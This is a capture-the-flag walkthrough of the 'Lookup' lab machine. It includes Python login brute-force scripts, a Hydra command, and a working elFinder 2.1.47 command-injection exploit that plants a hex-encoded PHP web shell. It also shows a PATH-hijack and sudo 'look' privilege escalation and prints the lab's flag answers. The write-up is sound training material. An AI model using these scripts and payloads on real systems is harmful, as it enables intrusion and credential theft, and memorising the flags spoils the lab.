# ENUMERATION
---

## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | ssh     |
| 80   | http    |

Let's visit the website:

![Pasted image 20241202135422.png](../../IMAGES/Pasted%20image%2020241202135422.png)

We need to add `lookup.thm` to `/etc/hosts`:

![Pasted image 20241202135528.png](../../IMAGES/Pasted%20image%2020241202135528.png)

We got a login page, let's check the source code:

![Pasted image 20241202135550.png](../../IMAGES/Pasted%20image%2020241202135550.png)

This page refers to a `login.php` section on the server, it uses a POST method, let's try to bruteforce it

# RECONNAISSANCE
---

As known, we need to bruteforce this login page, let's send the request to burp to check the way it performs in order to create a Python script or use hydra, I will send a request with the following credentials to test:

```ad-hint

#### Burp

`admin`: `1234`


If we send the request, we get the following:


If we follow the redirection, it just reloads the page, so, now that we know the way the request behave, let's create a python script to bruteforce our way in.
```



# EXPLOITATION
---

### Python
---


```python
import requests
import sys
import threading
from tqdm import tqdm

lock = threading.Lock()
valid_usernames = []
invalid_usernames = []


# Creating the function to check for usernames:

def check_username(url, username):
    # Setting up the invalid error we got from reading the burp request
    invalid_errors = [
        "Wrong username or password. Please try again."
    ]
    # Setting up the headers we got in the burp request
    headers = {
        'Host': 'lookup.thm',
        'User-Agent': 'Intigriti',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,'
                  'image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://lookup.thm',
        'Connection': 'keep-alive',
        'Referer': 'http://lookup.thm/login.php',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i',
    }
    # Creating the dictionary with our data
    data = {
        'username': username,
        'password': 'test',
        'function': 'login'
    }
    try:
        # Sending the request and reading the status code
        response = requests.post(url, headers=headers, data=data, allow_redirects=True)
        if response.status_code != 200:
            return sys.exit(1)
        # If there's no errors in the response text, we can append the username to the empty list we set up before
        if not any(error in response.text for error in invalid_errors):
            with lock:
                print(f'[+] Got valid username: {username}')
                valid_usernames.append(username)
        # Else, we append to invalid usernames list
        else:
            with lock:
                invalid_usernames.append(username)
    except requests.RequestException as e:
        print(f'[-] Error: {e}')


# Enumerating the usernames

def enumerate_usernames(wordlist):
    threads = []
    # We are opening the wordlist file and reading it, separating each line, so it can test for each username
    with open(wordlist, 'r') as f:
        usernames = f.readlines()
    try:
        # Next, create a progress bar using the tqdm library, also, creating a thread to speed up the process
        for username in tqdm(usernames, desc=f'Bruteforcing... ', unit=" usernames"):
            username = username.strip()
            if username:
                thread = threading.Thread(target=check_username, args=(url, username))
                threads.append(thread)
                thread.start()

                if len(threads) >= THREAD_COUNT:
                    for t in threads:
                        t.join()
                    threads = []
            for t in threads:
                t.join()

    except KeyboardInterrupt:
        print('\n Exiting program..')
        sys.exit(0)


# Setting up final things to be able to execute the script properly
if __name__ == '__main__':
    if len(sys.argv) != 4:
        print('Usage: python3 lookup_bruteforce.py <URl> <WORDLIST> <THREADS>')
        sys.exit(1)

    url = sys.argv[1]
    wordlist = sys.argv[2]
    THREAD_COUNT = int(sys.argv[3])
    enumerate_usernames(wordlist)
    print(f"[+] The total of invalid usernames are: {len(invalid_usernames)}")
    print(f"[+] The total of valid usernames are: {len(valid_usernames)}")
    print(f"\n[+] These are the valid usernames: {valid_usernames}")
```

With the following python code, we can brute force the usernames, this may take some time, so, we can also use the hydra way

![Pasted image 20241202142821.png](../../IMAGES/Pasted%20image%2020241202142821.png)

We got two usernames: `admin` and `jose`

#### Output
---


### Hydra
---


```ad-note

#### Hydra
---

`sudo hydra -VI -t 64 -L /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -p 'test' lookup.thm http-post-form '/login.php:username=^USER^&password=^PASS^:F=Wrong username or password. Please try again.' | grep -Eiv 'ATTEMPT'`

#### Output
---

Got the same usernames as before, let's bruteforce the password
```


For brute forcing the password, we can use the following Python code:

```python
import requests
import sys
from tqdm import tqdm
import threading

valid_passwords = []
invalid_passwords = []
lock = threading.Lock()


def check_user_password(url, user, password):
    invalid_errors = [
        "Wrong password. Please try again.",
        "Wrong username or password. Please try again."
    ]
    headers = {
        'Host': 'lookup.thm',
        'User-Agent': 'Intigriti',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,'
				  'image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://lookup.thm/',
        'Connection': 'keep-alive',
        'Referer': 'http://lookup.thm/login.php',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i',
    }

    data = {
        'username': user,
        'password': password
    }

    try:
        response = requests.post(url, headers=headers, data=data, allow_redirects=True)
        if not any(error in response.text for error in invalid_errors):
            with lock:
                print(f"Got VALID password: {password}")
                valid_passwords.append(password)
        else:
            invalid_passwords.append(password)

    except requests.RequestException as e:
        valid_passwords.append(password)
        print(f"Error checking password for {user} and {password}")


def enumerate_admin_password(WORDLIST):
    threads = []
    with open(WORDLIST, 'r', encoding='latin-1') as f:
        passwords = f.readlines()
    try:
        for password in tqdm(passwords, desc=f"Bruteforcing...{user}", unit=" passwords"):
            password = password.strip()  # Remove any leading/trailing whitespace
            if password:
                thread = threading.Thread(target=check_user_password, args=(url, user, password))
                threads.append(thread)
                thread.start()

                if len(threads) >= THREAD_COUNT:
                    for t in threads:
                        t.join()
                    threads = []

        for t in threads:
            t.join()

    except KeyboardInterrupt:
        print("\nExiting program...")
        sys.exit(0)


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python3 script.py <URL> <USER> <WORDLIST> <THREADS>")
        sys.exit(1)

    url = sys.argv[1]
    user = sys.argv[2].strip()
    WORDLIST = sys.argv[3]
    THREAD_COUNT = int(sys.argv[4].strip())
    enumerate_admin_password(WORDLIST)
    print(f"The total of invalid passwords for user {user} are: {len(invalid_passwords)}")
    print(f"The total of valid passwords for user {user} are: {len(valid_passwords)}")
    print(f"\nThese are the valid password for user {user}: {valid_passwords}")

```

When we run the script, we get the following:

![Pasted image 20241202144135.png](../../IMAGES/Pasted%20image%2020241202144135.png)

So, the credentials are: `jose`: `password123`

Let's login and take a look at it:

![Pasted image 20241202144230.png](../../IMAGES/Pasted%20image%2020241202144230.png)
Once we login, we find a `files.lookup.thm` domain we need to add to `/etc/hosts`, once we've added the domain, this appears:

![Pasted image 20241202144345.png](../../IMAGES/Pasted%20image%2020241202144345.png)

We got access to a file managing system, let's take a further look: 

![Pasted image 20241202144428.png](../../IMAGES/Pasted%20image%2020241202144428.png)

After checking the passwords that are in those files, all are useless, so, I decided to check at the info about the webapp, that's were I found that this is running something called `elFinder`, let's search that on searchsploit:

![Pasted image 20241202144558.png](../../IMAGES/Pasted%20image%2020241202144558.png)

This is running `elfinder 2.1.47` so, we got a command injection vulnerability for this specific version, it is a script written in python, let's look at the script:

![Pasted image 20241202144738.png](../../IMAGES/Pasted%20image%2020241202144738.png)

This is a script written in python, let's change it to python3 since it's a bit outdated, the script would be the following:

```python
#!/usr/bin/python3

import requests
import json
import sys


def upload(url, payload):
    files = {'upload[]': (payload, open('image_input.jpg', 'rb'))}
    data = {"reqid": "1693222c439f4", "cmd": "upload", "target": "l1_Lw", "mtime[]": "1497726174"}
    r = requests.post(f"{url}/php/connector.minimal.php", files=files, data=data)
    j = json.loads(r.text)
    return j['added'][0]['hash']

def imgRotate(url, hash):
    r = requests.get(f"{url}/php/connector.minimal.php?target={hash}&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c")
    return r.text

def shell(url):
    r = requests.get(f"{url}/php/image_input.php")
    if r.status_code == 200:
        print("[+] We're in :)")
        print("[+] Spawning a shell")
        while True:
            try:
                input_command = input("$ ")
                r = requests.get(f"{url}/php/image_input.php?c={input_command}")
                print(r.text)
                if input_command.strip() == "exit":
                    print("\nExiting.....")
                    sys.exit(0)
            except KeyboardInterrupt:
                sys.exit("\nSo long brother....")
    else:
        print("[*] Cannot reliably check exploitability T_T.")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python exploit.py http://IP:PORT/elFinder/ [IMAGE FILE]")
        print("""Note: 
              1. Copy or make an image file in the current working directory.
              2. Ensure that 'image_input.jpg' is literal file name for the image file.
              3. Ensure the image file is present in the current working directory. :)""")
        sys.exit(0)

    url = sys.argv[1]
    payload = "image_input.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > image_input.php;echo image_input.jpg"

    print("[*] Uploading sus image...")
    hash = upload(url, payload)
    print("[*] Executing the payload...")
    imgRotate(url, hash)
    shell(url)
```

We can either run this code or use the Metasploit exploit located at: `exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection`

![Pasted image 20241202145921.png](../../IMAGES/Pasted%20image%2020241202145921.png)

Once we've set everything, we got a shell, let's perform privilege escalation
# PRIVILEGE ESCALATION
---

To begin with, I used `find / -perm -u=s -type f 2>/dev/null` and got this output:

![Pasted image 20241202150045.png](../../IMAGES/Pasted%20image%2020241202150045.png)

We found something interesting a `/usr/sbin/pwm` file, asking Chatgpt for help related to that, it gave this path to perform the privilege escalation:

```ad-summary

First, we know that when we execute `id` we get this:


If we read the strings from our file, we see this:

We can see that it usesÂ `id`Â command then it uses this regexÂ `uid=%*u(%[^)])`Â to get the username part inÂ `uid`Â . We can also see here that it appends the username betweenÂ `/home/<username>/.passwords`Â and getting thatÂ `.passwords`Â file from that directory

Peeking at the home directory of userÂ `think`Â , we can see that he have that password file but we have no read permission to it.

So, we got the following observations: 

1. SetUID and SetGID Binary (`/usr/sbin/pwm`):

- This means that the binary runs with elevated privileges.
- It executes theÂ `id`Â command to extract the current user and then tries to access aÂ `.passwords`Â file in that userâ€™s home directory.

2.Â `.passwords`Â File:

- Located atÂ `/home/think/.passwords`.
- Permissions:Â Only accessible byÂ `root`Â and theÂ `think`Â user.
- Goal: We need to trick the binary into readingÂ `.passwords`

So, in order to exploit that, we need to reproduce the following steps:


1. Modify theÂ `$PATH`Â Variable:

- First, use theÂ `id`Â command to generate an output and replace the username with usernameÂ `think`Â ,Â we can useÂ `echo`Â command to replicate this:

`echo "uid=33(think) gid=33(think) groups=33(think)"`

- Create a maliciousÂ `id`Â binary in a directory you control (e.g.,Â `/dev/shm`)

$ `c ` 
$ `echo 'echo "uid=33(think) gid=33(think) groups=33(think)"' >> /dev/shm/id` # echoe's a uid in the context of user "think"  
$ `chmod +x /dev/shm/id`

- AdjustÂ `$PATH`Â to include this directoryÂ `/dev/shm`Â at the beginning so that the OS will be tricked that the binaryÂ `id`Â is coming fromÂ `/dev/shm`Â :

`export PATH=/dev/shm:$PATH`
`echo $PATH`

Now thatÂ `/dev/shm`Â is in theÂ **PATH**Â variable, we can now execute the binary:


We can use these passwords to bruteforce `think` ssh:

`hydra -l think -P passwords.txt 10.10.14.183 ssh`


We got the password!

`think`:`josemario.AKA(think)`
```

Now, let's log in to ssh as think:

![Pasted image 20241202151159.png](../../IMAGES/Pasted%20image%2020241202151159.png)

Nice, now we need a way to get into root, let's use `sudo -l` to check our permissions:

![Pasted image 20241202151236.png](../../IMAGES/Pasted%20image%2020241202151236.png)

We can use sudo in `/usr/bin/look`, let's check at what gtfobins have for us:


![Pasted image 20241202151340.png](../../IMAGES/Pasted%20image%2020241202151340.png)

We can actually read any file, for example, let's read `/etc/shadow`;

![Pasted image 20241202151437.png](../../IMAGES/Pasted%20image%2020241202151437.png)

From this point, we could either read both flags or getting into ssh as root by reading the `/root/.ssh/id_rsa` and setting read permissions on it, but for the sake of the CTF, let's just read both flags

![Pasted image 20241202151552.png](../../IMAGES/Pasted%20image%2020241202151552.png)
![Pasted image 20241202151634.png](../../IMAGES/Pasted%20image%2020241202151634.png)


```ad-note

##### Flags
---
1. `38375fb4dd8baa2b2039ac03d92b820e`
2. `5a285a9f257e45c68bb6c9f9f57d18e8`
```

Just like that CTF is done!

